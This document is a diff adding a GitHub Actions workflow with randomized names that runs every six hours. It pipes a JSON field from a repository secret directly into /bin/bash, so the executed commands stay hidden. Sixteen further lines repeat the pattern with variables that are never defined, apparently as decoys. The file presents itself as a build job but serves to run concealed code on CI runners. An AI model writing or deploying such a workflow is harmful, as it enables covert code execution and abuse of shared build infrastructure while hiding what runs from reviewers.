@@ -1,0 +1,34 @@
+name: luyaozhi7465
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luyaozhi7465
+        env:
+          nhtvb23218: ${{ secrets.nhtvb23218 }}
+        run: |
+          echo $nhtvb23218 | jq -r .jh2022 | /bin/bash
+          echo $mui8156 | jq -r .cxbg99 | /bin/bash
+          echo $cwoh4 | jq -r .nhfy65743 | /bin/bash
+          echo $slkc17529 | jq -r .lbjwf36670 | /bin/bash
+          echo $qhwp94666 | jq -r .i80621 | /bin/bash
+          echo $i77716 | jq -r .iz31 | /bin/bash
+          echo $mvi01 | jq -r .wwlft9934 | /bin/bash
+          echo $phals83720 | jq -r .esdm4 | /bin/bash
+          echo $s5 | jq -r .qwy335 | /bin/bash
+          echo $wd03628 | jq -r .eo4 | /bin/bash
+          echo $h75 | jq -r .iv5 | /bin/bash
+          echo $qri82 | jq -r .bjdmj4483 | /bin/bash
+          echo $m169 | jq -r .nh720 | /bin/bash
+          echo $a3 | jq -r .tpfg15 | /bin/bash
+          echo $n668 | jq -r .ta7172 | /bin/bash
+          echo $iviks11485 | jq -r .eib16983 | /bin/bash
+          echo $mmp85391 | jq -r .c048 | /bin/bash
+
